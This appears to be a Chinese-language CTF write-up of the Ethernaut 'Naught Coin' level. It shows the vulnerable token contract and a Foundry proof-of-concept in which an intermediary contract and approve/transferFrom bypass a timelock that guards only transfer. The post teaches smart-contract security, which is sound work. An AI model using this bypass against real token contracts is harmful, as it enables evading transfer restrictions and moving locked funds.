---
title: "Naught coin"
date: 2026-07-19
draft: false
description: "了解并会运用ERC20"
tags:
  - Ethernaut
  - ERC20
categories:
  - Ethernaut
series:
  - Ethernaut 闯关记录
---

## Naught coin

### 目标：

在定期结束之前，把我账户中的所有代币转移到另一个地址

### 思路：

想要转账需要调用`transfer`函数，首先要通过修饰器`lockTokens`，我的思路是不走if条件，使`msg.sender != player`，写一个中间合约即可达成。

下一步就是进行转账，我的账户中有`INITIAL_SUPPLY`个代币，要把他转到另外一个地址，我的思路是通过IERC20把我的代币授权给我的中间合约，然后利用ERC20中的transferFrom函数进行转账
我刚开始打算调用`Naught coin`的`transfer`进行转账，但是`transfer`只能调用Middle自己的钱，`approve`授权的钱必须通过`transferFrom函数`进行转账

调用`approve`函数必须放在Attack脚本中，因为`approve`中的函数是这样的

```
function approve(address spender, uint256 amount) external returns (bool);
{
	 _approve(msg.sender,spender,amount);
	 return true;
}
```

如果把msg.sender放在Middle合约中，msg.sender会变为`middle`的地址，会变为middle自己给自己转钱，导致失败

### 源码：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

### poc：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Naught.sol";

contract Middle{
    NaughtCoin naught = NaughtCoin(0xb7aF61e2B98958bE103a6ab5F7b2Aa80F5f6990d);

    function attack() external{
        naught.transferFrom(msg.sender,address(this),naught.INITIAL_SUPPLY());
    }
}
contract Attack is Script{
    NaughtCoin naught = NaughtCoin(0xb7aF61e2B98958bE103a6ab5F7b2Aa80F5f6990d);

    function run() external{
        vm.startBroadcast();

        Middle middle = new Middle();
        naught.approve(address(middle),naught.INITIAL_SUPPLY());
        middle.attack();

        vm.stopBroadcast();
    }
}
```

